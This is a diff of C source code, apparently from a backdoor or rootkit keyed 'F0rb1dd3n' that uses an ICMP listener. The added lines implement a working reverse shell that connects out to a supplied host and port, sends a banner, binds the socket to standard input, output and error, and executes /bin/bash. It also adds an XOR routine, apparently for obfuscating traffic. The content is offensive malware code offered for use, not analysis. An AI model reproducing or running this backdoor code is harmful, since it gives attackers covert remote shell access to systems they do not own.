@@ -24,10 +24,43 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <signal.h>
-#include "hacking.h"
 
 #define KEY		"F0rb1dd3n"
 #define PACKET_SIZE 	1024
+#define MOTD 		"\n\t\e[00;31mWellcome to F0rb1dd3n's sensual reverse shell!\n\n"
+
+void reverse_shell(char *host, int port){
+        int sockfd;
+        struct hostent *host_info;
+        struct sockaddr_in target_addr;
+        char *arg[] = {"/bin/bash", NULL};
+
+        if((host_info = gethostbyname(host)) == NULL)
+                exit(-1);
+
+        target_addr.sin_family = AF_INET;
+        target_addr.sin_port = htons(port);
+        target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
+        memset(&(target_addr.sin_zero), '\0', 8); 
+
+        if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
+                exit(-1);
+
+        if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
+                exit(-1);
+
+        send(sockfd, MOTD, strlen(MOTD), 0);
+        dup2(sockfd, 0);
+        dup2(sockfd, 1);
+        dup2(sockfd, 2);
+        execve("/bin/bash", arg, NULL);
+	close(sockfd);
+}
+
+void s_xor(char *arg, int key, int nbytes) {
+	int i;
+	for(i = 0; i < nbytes; i++) arg[i] ^= key;
+}
 
 void icmp_listener(void){
 	int sockfd, n, ksize;
